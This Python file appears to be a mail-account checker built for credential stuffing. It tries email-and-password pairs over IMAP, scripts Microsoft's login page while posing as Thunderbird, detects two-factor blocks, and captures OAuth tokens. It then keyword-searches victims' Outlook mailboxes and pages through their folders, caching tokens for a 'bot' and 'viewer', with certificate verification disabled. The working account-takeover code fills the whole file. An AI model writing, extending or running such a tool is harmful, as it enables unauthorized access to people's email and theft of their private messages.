import imaplib
import smtplib
import socket
import ssl
import re
import requests
from email import message_from_bytes
from typing import Dict, Any, List
from typing import Dict, Any, List

# Create a default SSL context
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Global dict to store OAuth tokens in memory (shared between bot and viewer)
oauth_tokens = {}

_OWA_FOLDER_FILTERS = {
    "Inbox":         "inbox",
    "Sent Items":    "sentitems",
    "Drafts":        "drafts",
    "Deleted Items": "deleteditems",
    "Junk Email":    "junkemail",
    "Archive":       "archive",
}

def safe_execute_with_retry(func, retries=2, timeout=10):
    for i in range(retries):
        try:
            return func()
        except socket.timeout:
            if i == retries - 1:
                raise
        except Exception as e:
            if i == retries - 1:
                raise

def clean_s(header_val) -> str:
    if not header_val: return ""
    from email.header import decode_header
    decoded = decode_header(header_val)
    res = ""
    for val, charset in decoded:
        if isinstance(val, bytes):
            try:
                res += val.decode(charset or 'utf-8', errors='ignore')
            except Exception:
                res += val.decode('utf-8', errors='ignore')
        else:
            res += str(val)
    return res

class MailAccessChecker:
    @staticmethod
    def check_imap_access(email: str, password: str, domain: str = None) -> Dict[str, Any]:
        if not domain:
            try:
                domain = email.split('@')[1]
            except IndexError:
                domain = "outlook.com"
        
        result = {
            "email": email,
            "method": "IMAP",
            "accessible": False,
            "servers_tried": [],
            "details": {},
            "error": "No servers reached"
        }
        
        servers = [("imap." + domain, 993), ("outlook.office365.com", 993), ("imap-mail.outlook.com", 993)]
        
        for server, port in servers:
            result["servers_tried"].append(f"{server}:{port}")
            
            def _attempt_login():
                imap_conn = imaplib.IMAP4_SSL(server, port, ssl_context=ctx, timeout=10)
                imap_conn.login(email, password)
                imap_conn.select('INBOX', readonly=True)
                return imap_conn

            try:
                imap_conn = safe_execute_with_retry(_attempt_login)
                result["accessible"] = True
                result["details"] = {
                    "server": server,
                    "port": port,
                }
                result["error"] = None
                imap_conn.logout()
                break
            except Exception as e:
                result["error"] = str(e)
        
        return result

    @staticmethod
    def check_inbox_access(email: str, password: str, limit: int = 5) -> Dict[str, Any]:
        result = {
            "email": email,
            "can_read_inbox": False,
            "message_count": 0,
            "messages": [],
            "error": None
        }
        
        try:
            domain = email.split('@')[1]
        except IndexError:
            domain = "outlook.com"
        imap_check = MailAccessChecker.check_imap_access(email, password, domain)
        
        if imap_check["accessible"]:
            try:
                server = imap_check["details"]["server"]
                port = imap_check["details"]["port"]
                
                def _do_fetch():
                    imap_conn = imaplib.IMAP4_SSL(server, port, ssl_context=ctx, timeout=10)
                    imap_conn.login(email, password)
                    return imap_conn

                imap_conn = safe_execute_with_retry(_do_fetch)
                status, count = imap_conn.select('INBOX')
                if status == 'OK':
                    result["can_read_inbox"] = True
                    result["message_count"] = int(count[0])
                    
                    if result["message_count"] > 0:
                        fetch_limit = min(limit, result["message_count"])
                        status, data = imap_conn.search(None, 'ALL')
                        ids = data[0].split()
                        for msg_id in ids[-fetch_limit:]:
                            res, msg_data = imap_conn.fetch(msg_id, '(RFC822)')
                            msg = message_from_bytes(msg_data[0][1])
                            
                            result["messages"].append({
                                "id": msg_id.decode(),
                                "from": clean_s(msg.get('From')),
                                "sub": clean_s(msg.get('Subject')),
                                "date": clean_s(msg.get('Date'))
                            })
                
                imap_conn.logout()
            except Exception as e:
                result["error"] = str(e)
        else:
            result["error"] = imap_check.get("error", "Access failed")
        
        return result

    @staticmethod
    def check_outlook_keywords(email: str, password: str, keywords: List[str] = None) -> Dict[str, Any]:
        """Check Outlook credentials via OAuth and optionally search for keywords."""
        result = {
            "email": email,
            "accessible": False,
            "mails": 0,
            "kw_match": False,
            "error": None,
            "cid": None
        }
        
        user = email
        auth_url = f"https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={user}&client_id=9e5f94bc-e8a4-4e73-b8be-63364c29d753&mkt=en&response_type=code&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FIMAP.AccessAsUser.All%20https%3A%2F%2Foutlook.office.com%2FSMTP.Send"
        headers = {
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Thunderbird/115.0",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "sec-fetch-site": "none",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9"
        }
        
        sess = requests.Session()
        try:
            r1 = sess.get(auth_url, headers=headers, timeout=20)
            
            # Robust Parse PPFT
            ppft = ""
            m = re.search(r'name="PPFT".*?value="([^"]+)"', r1.text)
            if not m: m = re.search(r'name=\\"PPFT\\".*?value=\\"([^\\"]+)\\"', r1.text)
            if not m: m = re.search(r'sFTTag:".*?value=\\"([^\\"]+)\\"', r1.text)
            if not m: m = re.search(r'sPPFT:\'(.+?)\'', r1.text)
            if m: ppft = m.group(1)
            
            # Robust Parse urlPost
            post_url = ""
            pu = re.search(r'"urlPost":"([^"]+)"', r1.text)
            if not pu: pu = re.search(r'urlPost:\\"([^\\"]+)\\"', r1.text)
            if not pu: pu = re.search(r'urlPost:\'([^\']+)\'', r1.text)
            if pu: post_url = pu.group(1).replace("\\", "")
            
            if not ppft or not post_url:
                 result["error"] = "Failed to parse login page"
                 return result
                 
            payload = f"i13=1&login={user}&loginfmt={user}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
            headers_post = headers.copy()
            headers_post.update({
                "Host": "login.live.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len(payload)),
                "Origin": "https://login.live.com",
                "Referer": r1.url,
            })
            
            r2 = sess.post(post_url, data=payload, headers=headers_post, allow_redirects=False, timeout=20)
            location = r2.headers.get('Location', '')
            
            success = False
            if "code=" in location or "JSH" in str(sess.cookies.get_dict()) or "oauth20_desktop.srf" in location:
                success = True
            elif "TwoFactor" in r2.text or "Challenge" in r2.text:
                result["error"] = "Two-Factor Auth Required"
                return result
                
            if not success:
                result["error"] = "Invalid Password"
                return result
                
            result["accessible"] = True
            
            # Get token to do search
            code = ""
            code_match = re.search(r'code=([^&]+)', location)
            if code_match: code = code_match.group(1)
            else:
                if "/cancel?mkt" in r2.text:
                    try:
                        opt = re.search(r'opidt%3d([^"]+)"', r2.text).group(1)
                        op = re.search(r'opid%3d([^%]+)%26', r2.text).group(1)
                        uaid = re.search(r'ame="uaid" id="uaid" value="([^"]+)"', r2.text).group(1)
                        hop_url = f"https://login.live.com/oauth20_authorize.srf?uaid={uaid}&client_id=9e5f94bc-e8a4-4e73-b8be-63364c29d753&opid={op}&mkt=EN-US&opidt={opt}&res=success&route=C105_BAY"
                        r_hop = sess.get(hop_url, headers=headers_post, allow_redirects=False)
                        location = r_hop.headers.get('Location', '')
                        code_match = re.search(r'code=([^&]+)', location)
                        if code_match: code = code_match.group(1)
                    except: pass

            if not code:
                return result # Access valid but can't search
                
            token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
            token_payload = f"client_info=1&client_id=9e5f94bc-e8a4-4e73-b8be-63364c29d753&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FIMAP.AccessAsUser.All%20https%3A%2F%2Foutlook.office.com%2FSMTP.Send"
            r_token = sess.post(token_url, data=token_payload, headers={"User-Agent": "Mozilla/5.0"}, timeout=20)
            auth_token = r_token.json().get('access_token')
            
            if not auth_token:
                return result
                
            cid = sess.cookies.get('MSPCID', '').upper()
            result["cid"] = cid
            
            # Cache the token globally for Web Viewer OWA usage
            oauth_tokens[user] = {"token": auth_token, "cid": cid}
            
            if keywords:
                formatted_keywords = " OR ".join([f'(subject:"{k}" OR body:"{k}")' for k in keywords])
                search_payload = {
                    "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                    "Scenario": {"Name": "owa.react"},
                    "TimeZone": "UTC",
                    "TextDecorations": "Off",
                    "EntityRequests": [{
                        "EntityType": "Conversation",
                        "ContentSources": ["Exchange"],
                        "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]},
                        "From": 0,
                        "Query": {"QueryString": formatted_keywords},
                        "Size": 25,
                        "Sort": [{"Field": "Score", "SortDirection": "Desc", "Count": 3}, {"Field": "Time", "SortDirection": "Desc"}],
                        "EnableTopResults": True,
                        "TopResultsCount": 3
                    }]
                }
                headers_search = {"Authorization": f"Bearer {auth_token}", "X-AnchorMailbox": f"CID:{cid}", "Content-Type": "application/json"}
                r_search = sess.post("https://outlook.live.com/search/api/v2/query", json=search_payload, headers=headers_search, timeout=20)
                search_data = r_search.text
                total_match = re.search(r'"Total":(\d+)', search_data)
                total_mails = int(total_match.group(1)) if total_match else 0
                
                result["mails"] = total_mails
                result["kw_match"] = total_mails > 0
                
        except Exception as e:
            result["error"] = str(e)
            
        return result

def owa_search(token: str, cid: str, folder: str, query: str, page: int = 1, size: int = 50) -> dict:
    skip = (page - 1) * size
    folder_filter = _OWA_FOLDER_FILTERS.get(folder, folder.lower())
    payload = {
        "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
        "Scenario": {"Name": "owa.react"},
        "TimeZone": "UTC",
        "TextDecorations": "Off",
        "EntityRequests": [{
            "EntityType": "Message",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": folder_filter}}]},
            "From": skip,
            "Query": {"QueryString": query if query else ""},
            "Size": size,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
            "EnableTopResults": False,
        }]
    }
    if not query:
        payload["EntityRequests"][0]["Query"] = {"QueryString": ""}
        
    headers = {
        "Authorization": f"Bearer {token}",
        "X-AnchorMailbox": f"CID:{cid}" if cid else "",
        "Content-Type": "application/json"
    }
    try:
        r = requests.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=headers, timeout=20)
        return r.json()
    except Exception as e:
        return {"error": str(e)}
